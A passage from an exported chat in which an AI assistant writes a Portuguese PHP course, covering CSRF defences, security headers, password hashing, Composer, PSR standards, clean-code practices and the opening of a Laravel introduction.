    <input type="number" name="valor" placeholder="Valor">
    <button type="submit">Transferir</button>
</form>
```

**Validando no servidor antes de processar qualquer POST:**

```php
<?php
function verificarCSRF(): void
{
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;

    $tokenEnviado = $_POST['csrf_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';

    if (!TokenCSRF::validar($tokenEnviado)) {
        http_response_code(403);
        die('Token CSRF inválido ou expirado.');
    }
}

// No início de qualquer script que processa POST:
session_start();
verificarCSRF();
```

---

## Middleware de segurança — centralizando as defesas

Em vez de repetir verificações em cada arquivo, crie um ponto central:

```php
<?php
declare(strict_types=1);

class MiddlewareDeSeguranca
{
    public static function aplicar(): void
    {
        // Headers de segurança em todas as respostas
        header('X-Content-Type-Options: nosniff');
        header('X-Frame-Options: SAMEORIGIN');
        header('X-XSS-Protection: 1; mode=block');
        header('Referrer-Policy: strict-origin-when-cross-origin');
        header("Content-Security-Policy: default-src 'self'; script-src 'self'");

        // Verifica CSRF em POSTs
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $token = $_POST['csrf_token'] ?? '';
            if (!TokenCSRF::validar($token)) {
                http_response_code(403);
                die('Requisição inválida.');
            }
        }
    }
}

// Em cada página (ou em um bootstrap que todas as páginas incluem):
session_start();
MiddlewareDeSeguranca::aplicar();
```

---

## Password hashing correto

Senhas nunca devem ser armazenadas em texto plano, nem com MD5 ou SHA1. Use `password_hash()`:

```php
<?php

// Criar senha
$hash = password_hash($senhaDigitada, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64MB de memória
    'time_cost'   => 4,      // 4 iterações
    'threads'     => 2,
]);

// Verificar senha
if (!password_verify($senhaDigitada, $hashNoBanco)) {
    // Senha incorreta
}

// Verificar se o hash precisa ser atualizado (algoritmo mais novo disponível)
if (password_needs_rehash($hashNoBanco, PASSWORD_ARGON2ID)) {
    $novoHash = password_hash($senhaDigitada, PASSWORD_ARGON2ID);
    // Atualiza no banco
}
```

---

## Resumo

| Ataque | Causa | Defesa |
|---|---|---|
| SQL Injection | Concatenar input em SQL | Prepared statements + whitelist para identificadores |
| XSS | Exibir input sem escape | `htmlspecialchars()` + CSP |
| CSRF | POST sem verificação de origem | Token CSRF sincronizado |
| Senha comprometida | Hash fraco ou sem hash | `password_hash()` com ARGON2ID |

---

## Exercício da semana

1. Audite um projeto PHP seu (ou um código de exemplo) buscando os três vetores: concatenação de SQL, echo sem htmlspecialchars, formulários POST sem token CSRF. Corrija cada ocorrência.

2. Implemente a classe `TokenCSRF` completa com testes PHPUnit: teste que tokens inválidos são rejeitados, que tokens expirados são rejeitados, e que `hash_equals` está sendo usado (mock para verificar timing safety).

3. Adicione um middleware que aplica automaticamente os headers de segurança HTTP em todas as respostas e valida o CSRF em POSTs.

4. Implemente um formulário de busca com ordenação dinâmica. Garanta que a coluna e direção de ordenação passam por whitelist antes de serem interpoladas na query.

5. **Desafio:** implemente uma segunda camada de proteção contra CSRF usando o header `Origin`/`Referer`: valide que o domínio de origem da requisição POST é o mesmo da aplicação. Combine com o token para defesa em profundidade.

---

## Referências

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- PHP Manual — password_hash: https://www.php.net/manual/pt_BR/function.password-hash.php

---

**Módulo 5 completo.** Quatro artigos (34–37) cobrindo formulários, sessions, upload e segurança.

---

# Artigo 38 — Composer e Namespaces

**Módulo 6 · Semana 38 · Nível: Intermediário**

---

## Introdução

Antes do Composer, gerenciar dependências em PHP era um pesadelo manual: baixar arquivos, copiá-los para o projeto, atualizar à mão, rezar para que as versões fossem compatíveis. Em 2012, o Composer mudou tudo. Hoje é impossível trabalhar profissionalmente com PHP sem ele.

Namespaces, introduzidos no PHP 5.3, resolvem um problema diferente mas relacionado: colisão de nomes. Sem namespaces, duas bibliotecas que definem uma classe `Router` causam conflito. Com namespaces, `Symfony\Component\Routing\Router` e `League\Route\Router` coexistem sem problema.

---

## Namespaces — organizando o código

Um namespace é como um pacote ou diretório lógico para suas classes. Declare no topo do arquivo, antes de qualquer código:

```php
<?php
declare(strict_types=1);

namespace App\Domain\Usuario;

// Esta classe vive em App\Domain\Usuario\Usuario
class Usuario
{
    public function __construct(
        public readonly int    $id,
        public readonly string $nome,
        public readonly string $email,
    ) {}
}
```

```php
<?php
declare(strict_types=1);

namespace App\Infrastructure\Persistence;

use App\Domain\Usuario\Usuario;                  // importa a classe
use App\Domain\Usuario\UsuarioRepositorioInterface; // importa interface
use PDO;                                           // classe global (sem namespace)

class UsuarioRepositorioPDO implements UsuarioRepositorioInterface
{
    public function __construct(private readonly PDO $pdo) {}

    public function buscarPorId(int $id): ?Usuario
    {
        $stmt = $this->pdo->prepare('SELECT * FROM usuarios WHERE id = ?');
        $stmt->execute([$id]);
        $row = $stmt->fetch();

        if (!$row) return null;

        return new Usuario($row['id'], $row['nome'], $row['email']);
    }
}
```

**Alias — quando dois namespaces têm o mesmo nome de classe:**

```php
<?php
use App\Domain\Pedido\Status;
use App\Domain\Pagamento\Status as StatusPagamento; // alias

$status          = new Status('pendente');
$statusPagamento = new StatusPagamento('aguardando');
```

---

## PSR-4 — Autoloading padronizado

PSR-4 é o padrão que mapeia namespaces para diretórios. Com ele, o PHP sabe onde encontrar cada classe sem que você precise fazer `require` manualmente:

```
src/
├── Domain/
│   └── Usuario/
│       ├── Usuario.php                  → App\Domain\Usuario\Usuario
│       └── UsuarioRepositorioInterface.php → App\Domain\Usuario\UsuarioRepositorioInterface
└── Infrastructure/
    └── Persistence/
        └── UsuarioRepositorioPDO.php    → App\Infrastructure\Persistence\UsuarioRepositorioPDO
```

---

## Composer — gerenciamento de dependências

O arquivo `composer.json` é o coração de qualquer projeto PHP moderno. Ele define o projeto, suas dependências e o mapeamento PSR-4:

```json
{
    "name": "empresa/meu-projeto",
    "description": "Sistema de gestão de pedidos",
    "type": "project",
    "require": {
        "php": "^8.2",
        "monolog/monolog": "^3.0",
        "vlucas/phpdotenv": "^5.0"
    },
    "require-dev": {
        "phpunit/phpunit": "^11.0",
        "phpstan/phpstan": "^1.10"
    },
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    },
    "autoload-dev": {
        "psr-4": {
            "Tests\\": "tests/"
        }
    },
    "config": {
        "optimize-autoloader": true,
        "sort-packages": true
    }
}
```

**Comandos essenciais:**

```bash
# Instalar todas as dependências do composer.json
composer install

# Adicionar uma nova dependência
composer require guzzlehttp/guzzle

# Adicionar dependência apenas para desenvolvimento
composer require --dev phpunit/phpunit

# Atualizar todas as dependências para as versões mais recentes permitidas
composer update

# Atualizar apenas uma dependência
composer update monolog/monolog

# Regenerar o autoloader após adicionar classes manualmente
composer dump-autoload

# Verificar se há vulnerabilidades de segurança
composer audit
```

---

## Versionamento semântico

O Composer usa semver (Semantic Versioning): `MAJOR.MINOR.PATCH`.

```json
{
    "require": {
        "vendor/pacote": "^2.1.0"
    }
}
```

| Operador | Significado | Exemplo |
|---|---|---|
| `^2.1.0` | `>= 2.1.0` e `< 3.0.0` | Aceita atualizações minor e patch |
| `~2.1.0` | `>= 2.1.0` e `< 2.2.0` | Aceita apenas atualizações patch |
| `2.1.0` | Exatamente `2.1.0` | Sem flexibilidade |
| `*` | Qualquer versão | Evite em produção |
| `>=2.0 <3.0` | Intervalo explícito | Equivalente a `^2.0` |

O `composer.lock` registra as versões exatas instaladas. Sempre commite o `composer.lock` em projetos de aplicação — garante que todos os membros da equipe (e o servidor de produção) usem exatamente as mesmas versões. Em bibliotecas, não commite o `composer.lock`.

---

## Usando as dependências

```php
<?php
declare(strict_types=1);

// O autoloader do Composer — inclua uma única vez no bootstrap da aplicação
require __DIR__ . '/vendor/autoload.php';

use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Dotenv\Dotenv;

// Carrega variáveis de ambiente do arquivo .env
$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

// Cria um logger
$log = new Logger('app');
$log->pushHandler(new StreamHandler(__DIR__ . '/storage/logs/app.log', Logger::DEBUG));

$log->info('Aplicação iniciada', [
    'ambiente' => $_ENV['APP_ENV'] ?? 'production',
    'versao'   => '1.0.0',
]);

// Acessa variável de ambiente definida no .env
$dsn = $_ENV['DATABASE_URL'];
```

---

## Criando sua própria biblioteca com Composer

```json
{
    "name": "ricardomatosdev/validador",
    "description": "Biblioteca de validação para PHP",
    "type": "library",
    "license": "MIT",
    "authors": [
        {
            "name": "Ricardo Matos",
            "email": "contato@ricardomatosdev.com"
        }
    ],
    "require": {
        "php": "^8.2"
    },
    "autoload": {
        "psr-4": {
            "RicardoMatos\\Validador\\": "src/"
        }
    },
    "autoload-dev": {
        "psr-4": {
            "RicardoMatos\\Validador\\Tests\\": "tests/"
        }
    }
}
```

---

## Resumo

| Conceito | Função |
|---|---|
| Namespace | Agrupa classes em espaços lógicos, evita colisão de nomes |
| `use` | Importa uma classe para o escopo atual |
| PSR-4 | Mapeia namespaces para diretórios de forma padronizada |
| Composer | Gerencia dependências, autoloading e scripts |
| `composer.lock` | Garante reprodutibilidade das versões instaladas |
| `^` no semver | Permite atualizações compatíveis (minor + patch) |

---

## Exercício da semana

1. Crie um projeto do zero com `composer init`. Configure o PSR-4 para o namespace `MeuProjeto\\` apontando para `src/`. Crie três classes em subnamespaces diferentes e instancie-as sem nenhum `require` manual.

2. Adicione as dependências `monolog/monolog` e `vlucas/phpdotenv`. Configure um logger que escreve em arquivo e um arquivo `.env` com as configurações do banco de dados. Leia as variáveis no código.

3. Instale `phpstan/phpstan` como dependência de desenvolvimento. Execute `vendor/bin/phpstan analyse src/ --level=5`. Corrija todos os erros apontados.

4. **Desafio:** publique uma mini biblioteca no GitHub (não precisa ir para o Packagist) com namespace próprio, testes, README e `composer.json` completo. Instale-a em outro projeto usando o repositório VCS do Composer.

---

## Referências

- Documentação oficial do Composer: https://getcomposer.org/doc/
- PSR-4 Autoloading Standard: https://www.php-fig.org/psr/psr-4/
- Packagist (repositório de pacotes PHP): https://packagist.org/
- Semantic Versioning: https://semver.org/lang/pt-BR/

---

# Artigo 39 — PSR e Padrões de Código

**Módulo 6 · Semana 39 · Nível: Intermediário**

---

## Introdução

PSR significa PHP Standards Recommendation — recomendações criadas pelo PHP-FIG (Framework Interoperability Group), um grupo formado pelos mantenedores dos principais frameworks e bibliotecas PHP. O objetivo é garantir interoperabilidade: que componentes de diferentes projetos funcionem juntos sem atrito.

Conhecer as PSRs mais importantes não é pedantismo acadêmico. É falar a língua da comunidade PHP profissional, entender como frameworks como Laravel e Symfony funcionam por dentro, e escrever código que qualquer desenvolvedor PHP experiente vai reconhecer imediatamente.

---

## PSR-1 e PSR-12 — Estilo de código

PSR-1 define o básico: arquivos PHP usam apenas `<?php` ou `<?=`, declaram classes ou executam efeitos (não ambos no mesmo arquivo), e seguem StudlyCaps para nomes de classes.

PSR-12 é a extensão moderna que substitui a PSR-2. Os pontos principais:

```php
<?php
declare(strict_types=1);          // declare logo após a abertura

namespace App\Domain\Pedido;      // linha em branco antes e depois

use App\Domain\Shared\Dinheiro;   // use statements agrupados
use DateTimeImmutable;

class Pedido                      // { na mesma linha da declaração
{                                 // exceto para classes, métodos e funções
    private const STATUS_PENDENTE = 'pendente';

    private array $itens = [];    // 4 espaços de indentação (não tabs)

    public function __construct(  // parâmetros longos: um por linha
        private readonly int $id,
        private string $status = self::STATUS_PENDENTE,
        private readonly DateTimeImmutable $criadoEm = new DateTimeImmutable(),
    ) {}

    public function adicionarItem(   // visibilidade sempre declarada
        int $produtoId,
        int $quantidade,
        Dinheiro $preco,
    ): void {
        if ($quantidade <= 0) {      // espaço antes do (
            throw new \InvalidArgumentException('Quantidade inválida.');
        }                            // } na própria linha

        $this->itens[] = [
            'produto_id' => $produtoId,
            'quantidade' => $quantidade,
            'preco'      => $preco,
        ];
    }

    public function total(): Dinheiro
    {
        return array_reduce(
            $this->itens,
            fn(Dinheiro $acc, array $item) => $acc->somar(
                $item['preco']->multiplicar($item['quantidade'])
            ),
            Dinheiro::de(0),
        );
    }
}
```

**PHP CS Fixer — formatação automática:**

```bash
composer require --dev friendsofphp/php-cs-fixer

# Cria o arquivo de configuração .php-cs-fixer.php
cat > .php-cs-fixer.php << 'EOF'
<?php
return (new PhpCsFixer\Config())
    ->setRules([
        '@PSR12'                         => true,
        'declare_strict_types'           => true,
        'array_syntax'                   => ['syntax' => 'short'],
        'ordered_imports'                => ['sort_algorithm' => 'alpha'],
        'no_unused_imports'              => true,
        'trailing_comma_in_multiline'    => true,
    ])
    ->setFinder(PhpCsFixer\Finder::create()->in('src')->in('tests'));
EOF

# Verificar sem alterar
vendor/bin/php-cs-fixer fix --dry-run --diff

# Corrigir automaticamente
vendor/bin/php-cs-fixer fix
```

---

## PSR-3 — Interface de Logger

PSR-3 define uma interface padrão para logging. Qualquer biblioteca que aceite um `LoggerInterface` funciona com Monolog, ou com qualquer outro logger PSR-3 compatível:

```php
<?php
use Psr\Log\LoggerInterface;
use Psr\Log\LogLevel;

class ProcessadorDePedidos
{
    // Recebe a interface, não a implementação concreta
    public function __construct(private readonly LoggerInterface $logger) {}

    public function processar(Pedido $pedido): void
    {
        $this->logger->info('Processando pedido', ['id' => $pedido->id]);

        try {
            // processamento...
            $this->logger->info('Pedido processado com sucesso', ['id' => $pedido->id]);
        } catch (\Exception $e) {
            $this->logger->error('Falha ao processar pedido', [
                'id'    => $pedido->id,
                'erro'  => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ]);
            throw $e;
        }
    }
}

// Níveis PSR-3 (do menos para o mais grave):
// debug, info, notice, warning, error, critical, alert, emergency
```

---

## PSR-7 — HTTP Messages

PSR-7 define interfaces para representar requisições e respostas HTTP como objetos imutáveis. É a base de frameworks como Slim, Laminas e middlewares PSR-15:

```php
<?php
use Psr\Http\Message\ServerRequestInterface;
use Psr\Http\Message\ResponseInterface;

// Um handler de rota recebe uma Request e retorna uma Response
function listarUsuarios(ServerRequestInterface $request): ResponseInterface
{
    $queryParams = $request->getQueryParams();
    $pagina      = (int) ($queryParams['pagina'] ?? 1);

    $usuarios = buscarUsuarios($pagina);

    // Response é imutável — withHeader retorna uma nova instância
    $response = new \Nyholm\Psr7\Response();
    $response = $response
        ->withHeader('Content-Type', 'application/json')
        ->withStatus(200);

    $response->getBody()->write(json_encode($usuarios));

    return $response;
}
```

---

## PSR-11 — Container de Injeção de Dependência

PSR-11 define a interface para containers de DI. Laravel, Symfony e PHP-DI todos implementam esta interface:

```php
<?php
use Psr\Container\ContainerInterface;

class ServiceLocator
{
    public function __construct(private readonly ContainerInterface $container) {}

    public function obterServico(string $id): mixed
    {
        if (!$this->container->has($id)) {
            throw new \RuntimeException("Serviço não registrado: {$id}");
        }
        return $this->container->get($id);
    }
}

// Implementação simples de container
class Container implements ContainerInterface
{
    private array $bindings  = [];
    private array $instancias = [];

    public function bind(string $abstract, callable $factory): void
    {
        $this->bindings[$abstract] = $factory;
    }

    public function singleton(string $abstract, callable $factory): void
    {
        $this->bindings[$abstract] = function () use ($abstract, $factory) {
            if (!isset($this->instancias[$abstract])) {
                $this->instancias[$abstract] = $factory($this);
            }
            return $this->instancias[$abstract];
        };
    }

    public function get(string $id): mixed
    {
        if (!$this->has($id)) {
            throw new \RuntimeException("Não encontrado: {$id}");
        }
        return ($this->bindings[$id])($this);
    }

    public function has(string $id): bool
    {
        return isset($this->bindings[$id]);
    }
}

// Configurando o container:
$container = new Container();

$container->singleton(PDO::class, fn() => new PDO(
    'pgsql:host=localhost;dbname=loja',
    'user', 'pass',
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
));

$container->bind(
    UsuarioRepositorioInterface::class,
    fn(ContainerInterface $c) => new UsuarioRepositorioPDO($c->get(PDO::class))
);

$container->bind(
    ProcessadorDePedidos::class,
    fn(ContainerInterface $c) => new ProcessadorDePedidos($c->get(LoggerInterface::class))
);
```

---

## PHPStan — análise estática de tipos

PHPStan analisa o código sem executá-lo, detectando erros de tipo, chamadas a métodos inexistentes, variáveis não definidas e muitos outros problemas:

```bash
composer require --dev phpstan/phpstan

# Configura em phpstan.neon
cat > phpstan.neon << 'EOF'
parameters:
    level: 8          # 0 a 9 — quanto maior, mais rigoroso
    paths:
        - src
    checkMissingIterableValueType: false
EOF

vendor/bin/phpstan analyse
```

```php
<?php
// PHPStan detecta isso como erro no nível 5+:

function processarId(int $id): string
{
    $resultado = buscarNoBanco($id); // retorna string|null

    return strtoupper($resultado); // ERRO: argumento pode ser null
}

// Correto:
function processarId(int $id): string
{
    $resultado = buscarNoBanco($id);

    if ($resultado === null) {
        throw new \RuntimeException("ID {$id} não encontrado.");
    }

    return strtoupper($resultado);
}
```

---

## Resumo das PSRs mais importantes

| PSR | Assunto | Uso prático |
|---|---|---|
| PSR-1 | Estilo básico | Base de todo código PHP profissional |
| PSR-4 | Autoloading | Mapeamento namespace → diretório |
| PSR-3 | Logger | Interface comum para logging |
| PSR-7 | HTTP Messages | Requisições/respostas imutáveis |
| PSR-11 | Container DI | Interface comum para containers |
| PSR-12 | Estilo estendido | Formatação consistente do código |

---

## Exercício da semana

1. Instale `friendsofphp/php-cs-fixer` e configure para PSR-12 + `declare_strict_types`. Rode em um projeto existente e analise as diferenças reportadas.

2. Instale `phpstan/phpstan` e rode no nível 5. Corrija todos os erros. Depois suba para o nível 7 e corrija novamente.

3. Implemente o container de DI da aula. Adicione suporte a autowiring básico: se a classe tem um construtor com type hints de classes registradas, resolva automaticamente.

4. Refatore uma classe que usa `error_log()` diretamente para receber um `LoggerInterface` por injeção de dependência. Use Monolog como implementação concreta, injetado pelo container.

5. **Desafio:** crie um pipeline de CI simples com GitHub Actions (ou script Makefile) que rode `php-cs-fixer --dry-run`, `phpstan analyse`, e `phpunit` em sequência — e falhe se qualquer um deles falhar.

---

## Referências

- PHP-FIG (todas as PSRs): https://www.php-fig.org/psr/
- PHP CS Fixer: https://cs.symfony.com/
- PHPStan: https://phpstan.org/
- Packagist — PSR interfaces: https://packagist.org/packages/psr/log

---

# Artigo 40 — Boas Práticas e Código Limpo em PHP

**Módulo 6 · Semana 40 · Nível: Intermediário–Avançado**

---

## Introdução

Boas práticas não são regras arbitrárias inventadas por puristas. São soluções destiladas de décadas de experiência coletiva com código que ficou difícil de manter, difícil de testar, e difícil de entender. Neste artigo reunimos os princípios mais impactantes para escrever PHP profissional: código que se lê como prosa, que resiste ao tempo e que você não se envergonha de mostrar.

---

## Declare tipos em tudo

O sistema de tipos do PHP 8 é expressivo e poderoso. Use-o:

```php
<?php
declare(strict_types=1); // Sempre — ativa verificação estrita de tipos

// Ruim: sem tipos
function calcularDesconto($preco, $percentual) {
    return $preco * (1 - $percentual / 100);
}

// Bom: tipos completos
function calcularDesconto(float $preco, float $percentual): float
{
    if ($percentual < 0 || $percentual > 100) {
        throw new \InvalidArgumentException("Percentual inválido: {$percentual}");
    }
    return $preco * (1 - $percentual / 100);
}

// Ainda melhor: Value Objects eliminam a necessidade de validar sempre
function calcularDesconto(Dinheiro $preco, Percentual $percentual): Dinheiro
{
    return $preco->aplicarDesconto($percentual);
}

// Union types — quando necessário
function buscarOuCriar(int|string $id): Usuario { /* ... */ }

// Nullable — quando null é um valor legítimo
function buscarPorEmail(string $email): ?Usuario { /* ... */ }

// Never — função que nunca retorna (sempre lança exceção ou encerra)
function falhar(string $mensagem): never
{
    throw new \RuntimeException($mensagem);
}
```

---

## Nomes que explicam a intenção

```php
<?php
// Ruim: o que é $d? O que faz $proc?
$d = new DateTime();
function proc($u, $p): bool { /* ... */ }

// Bom: nomes revelam intenção
$dataDeNascimento = new DateTimeImmutable('1990-05-15');
function verificarSenha(string $senhaDigitada, string $hashArmazenado): bool { /* ... */ }

// Ruim: abreviações crípticas
$usr = $uRepo->findById($uid);
$ord->addItm($prd, $qty, $prc);

// Bom: verbosidade que clarifica
$usuario = $usuarioRepositorio->buscarPorId($usuarioId);
$pedido->adicionarItem($produto, $quantidade, $preco);

// Booleans: prefixos que comunicam
$estaAtivo        = true;
$podeEditarPerfil = false;
$temEstoqueDisponivel = $produto->estoque > 0;

// Funções booleans: verbos is/has/can/deve
function isEmailValido(string $email): bool { /* ... */ }
function temPermissao(Usuario $usuario, string $recurso): bool { /* ... */ }
function podeRealizarCompra(Usuario $usuario, Pedido $pedido): bool { /* ... */ }
```

---

## Funções pequenas com uma responsabilidade

```php
<?php
// Ruim: uma função fazendo tudo
function processarCadastro(array $dados): array
{
    // validação
    if (empty($dados['nome'])) return ['erro' => 'Nome obrigatório'];
    if (!filter_var($dados['email'], FILTER_VALIDATE_EMAIL)) return ['erro' => 'Email inválido'];

    // hash de senha
    $hash = password_hash($dados['senha'], PASSWORD_ARGON2ID);

    // inserção no banco
    global $pdo;
    $pdo->prepare('INSERT INTO usuarios ...');

    // envio de email
    mail($dados['email'], 'Bem-vindo!', '...');

    return ['sucesso' => true];
}

// Bom: responsabilidades separadas
function validarDadosDeCadastro(array $dados): array // retorna erros
{
    $erros = [];
    if (empty(trim($dados['nome'] ?? ''))) $erros['nome'] = 'Nome obrigatório.';
    if (!filter_var($dados['email'] ?? '', FILTER_VALIDATE_EMAIL)) $erros['email'] = 'Email inválido.';
    if (strlen($dados['senha'] ?? '') < 8) $erros['senha'] = 'Senha deve ter 8+ caracteres.';
    return $erros;
}

class CadastroService
{
    public function __construct(
        private readonly UsuarioRepositorioInterface $repositorio,
        private readonly EmailService                $emailService,
    ) {}

    public function cadastrar(DadosDeCadastro $dados): Usuario
    {
        $usuario = $this->repositorio->salvar(
            new Usuario(
                nome:      $dados->nome,
                email:     $dados->email,
                senhaHash: password_hash($dados->senha, PASSWORD_ARGON2ID),
            )
        );

        $this->emailService->enviarBoasVindas($usuario);

        return $usuario;
    }
}
```

---

## Early return — evite else desnecessário

```php
<?php
// Ruim: aninhamento excessivo
function processarPagamento(Pedido $pedido, Usuario $usuario): string
{
    if ($pedido->estaAtivo()) {
        if ($usuario->temSaldoSuficiente($pedido->total())) {
            if (!$pedido->jaFoiPago()) {
                // processa...
                return 'Pagamento realizado.';
            } else {
                return 'Pedido já foi pago.';
            }
        } else {
            return 'Saldo insuficiente.';
        }
    } else {
        return 'Pedido inativo.';
    }
}

// Bom: early return elimina o aninhamento
function processarPagamento(Pedido $pedido, Usuario $usuario): string
{
    if (!$pedido->estaAtivo()) {
        return 'Pedido inativo.';
    }

    if ($pedido->jaFoiPago()) {
        return 'Pedido já foi pago.';
    }

    if (!$usuario->temSaldoSuficiente($pedido->total())) {
        return 'Saldo insuficiente.';
    }

    // Chegou aqui: todas as condições satisfeitas
    // processa...
    return 'Pagamento realizado.';
}
```

---

## Imutabilidade onde possível

```php
<?php
// Value Objects são imutáveis por definição
final class Email
{
    public function __construct(
        private readonly string $valor // readonly: não pode ser alterado após construção
    ) {
        if (!filter_var($valor, FILTER_VALIDATE_EMAIL)) {
            throw new \InvalidArgumentException("Email inválido: {$valor}");
        }
    }

    // "Modificação" retorna nova instância
    public function comDominio(string $novoDominio): self
    {
        [$local] = explode('@', $this->valor);
        return new self("{$local}@{$novoDominio}");
    }

    public function valor(): string { return $this->valor; }
}

// PHP 8.1+ readonly classes
final readonly class Coordenada
{
    public function __construct(
        public float $latitude,
        public float $longitude,
    ) {
        if ($this->latitude < -90 || $this->latitude > 90) {
            throw new \InvalidArgumentException('Latitude inválida.');
        }
    }
}
```

---

## Prefira exceções a códigos de erro

```php
<?php
// Ruim: retorna false/null em caso de erro — o chamador pode ignorar
function dividir(float $a, float $b): float|false
{
    if ($b === 0.0) return false;
    return $a / $b;
}

$resultado = dividir(10, 0); // false — fácil de ignorar acidentalmente

// Bom: exceção que não pode ser ignorada silenciosamente
function dividir(float $a, float $b): float
{
    if ($b === 0.0) {
        throw new \DivisionByZeroError('Divisor não pode ser zero.');
    }
    return $a / $b;
}

// Hierarquia de exceções próprias — comunicam o problema com precisão
class DomainException extends \RuntimeException {}
class EstoqueInsuficienteException extends DomainException
{
    public function __construct(
        public readonly int $disponivel,
        public readonly int $solicitado,
    ) {
        parent::__construct(
            "Estoque insuficiente: {$disponivel} disponível, {$solicitado} solicitado."
        );
    }
}
```

---

## Resumo das boas práticas

| Prática | Por que importa |
|---|---|
| `declare(strict_types=1)` | Evita coerções silenciosas de tipo |
| Nomes descritivos | Código é lido muito mais do que escrito |
| Funções pequenas | Fáceis de testar, entender e reutilizar |
| Early return | Reduz aninhamento e aumenta clareza |
| Imutabilidade | Elimina bugs de estado compartilhado |
| Exceções em vez de null/false | Erros não podem ser ignorados silenciosamente |
| Injeção de dependência | Código testável e desacoplado |

---

## Exercício da semana

1. Pegue um arquivo PHP antigo seu (ou de um repositório open-source) e aplique as práticas deste artigo: adicione tipos, renomeie variáveis, extraia funções, aplique early return. Documente as mudanças e compare a legibilidade.

2. Implemente uma hierarquia de exceções para um domínio de sua escolha: `DomainException` como base, e pelo menos três exceções específicas com dados contextuais nos construtores.

3. Crie uma classe `Dinheiro` completamente imutável com `readonly`, `final`, e sem setters. Implemente: `somar()`, `subtrair()`, `multiplicar()`, `dividir()`, `aplicarDesconto()`, `equals()`. Escreva testes para cada método.

4. **Desafio:** refatore uma função longa (20+ linhas) extraindo subfunções nomeadas que expliquem cada etapa do processo. O objetivo é que o corpo da função original leia como uma sequência de frases em português: `$this->validarDados($dados); $usuario = $this->criarUsuario($dados); $this->notificar($usuario);`

---

## Referências

- Clean Code (livro) — Robert C. Martin: https://www.amazon.com.br/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882
- PHP The Right Way: https://phptherightway.com/
- PHPStan — análise estática: https://phpstan.org/
- Refactoring Guru — padrões e refatoração: https://refactoring.guru/

---

**Módulo 6 completo** — 3 artigos (38–40) cobrindo Composer, namespaces, PSR e boas práticas.

**Progresso total: 40/52 artigos — só textos, conforme combinado.**

Próximo: **Módulo 7 — Laravel** (artigos 41–46). São 6 artigos cobrindo instalação, rotas, Eloquent, Blade, autenticação e APIs com Laravel. Continuo?

---

# you asked

message time: 2026-03-10 08:31:56

Sim

---

# claude response

# Artigo 41 — Introdução ao Laravel

**Módulo 7 · Semana 41 · Nível: Intermediário**

---

## Introdução

Laravel é o framework PHP mais popular do mundo, e por boas razões. Ele não apenas resolve problemas técnicos — ele define uma forma de pensar sobre o desenvolvimento web. Com Laravel, você tem um roteador expressivo, ORM elegante, sistema de templates, autenticação, filas, eventos, testes e dezenas de outros recursos integrados e funcionando em harmonia desde o primeiro `composer create-project`.

Mas Laravel não é magia. Cada recurso que ele oferece é construído sobre os fundamentos que você já aprendeu: namespaces, PSR-4, injeção de dependência, interfaces, padrões de projeto. Entender isso transforma você de um usuário do framework em alguém que realmente domina o que está usando.

---

## Instalação e estrutura

```bash
# Criando um novo projeto Laravel
composer create-project laravel/laravel minha-loja

cd minha-loja

# Iniciando o servidor de desenvolvimento
php artisan serve
# http://localhost:8000

# Ou com o Laravel Herd (recomendado para desenvolvimento local)
# https://herd.laravel.com/
```

**Estrutura de diretórios:**

```
minha-loja/
├── app/
│   ├── Http/
│   │   ├── Controllers/     ← Controladores
│   │   └── Middleware/      ← Middlewares HTTP
│   ├── Models/              ← Models Eloquent
│   ├── Providers/           ← Service Providers
│   └── Services/            ← Lógica de negócio (você cria)
├── bootstrap/               ← Bootstrap da aplicação
├── config/                  ← Configurações (database, mail, etc.)
├── database/
│   ├── factories/           ← Factories para testes
│   ├── migrations/          ← Migrations de banco de dados
│   └── seeders/             ← Seeds de dados iniciais
├── public/                  ← Document root (index.php)
├── resources/
│   └── views/               ← Templates Blade
├── routes/
│   ├── web.php              ← Rotas web (com sessão, CSRF)
│   └── api.php              ← Rotas API (stateless)
├── storage/                 ← Logs, cache, uploads
├── tests/                   ← Testes automatizados
├── .env                     ← Variáveis de ambiente
└── artisan                  ← CLI do Laravel
```

---

## Configuração — o arquivo .env

```bash
# .env
APP_NAME="Minha Loja"
APP_ENV=local
APP_KEY=base64:...        # Gerado automaticamente — nunca commite
APP_DEBUG=true
APP_URL=http://localhost:8000

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=minha_loja
DB_USERNAME=root
DB_PASSWORD=

MAIL_MAILER=smtp
MAIL_HOST=mailpit
MAIL_PORT=1025
```

O arquivo `.env` nunca vai para o git (está no `.gitignore`). Em vez disso, commite o `.env.example` com as chaves mas sem os valores sensíveis. Para gerar a `APP_KEY`:

```bash
php artisan key:generate
```

---

## Roteamento

```php
<?php
// routes/web.php

use App\Http\Controllers\ProdutoController;
use App\Http\Controllers\CarrinhoController;
use Illuminate\Support\Facades\Route;

// Rota simples com closure
Route::get('/', function () {
    return view('home');
});

// Rota com parâmetro
Route::get('/produtos/{id}', function (int $id) {
    return "Produto: {$id}";
});

// Rota com parâmetro opcional
Route::get('/blog/{slug?}', function (?string $slug = null) {
    return $slug ? "Post: {$slug}" : "Lista do blog";
});

// Rota apontando para controller
Route::get('/produtos', [ProdutoController::class, 'index']);
Route::get('/produtos/{produto}', [ProdutoController::class, 'show']);
Route::post('/produtos', [ProdutoController::class, 'store']);
Route::put('/produtos/{produto}', [ProdutoController::class, 'update']);
Route::delete('/produtos/{produto}', [ProdutoController::class, 'destroy']);

// Resource route — cria as 7 rotas CRUD de uma vez
Route::resource('produtos', ProdutoController::class);

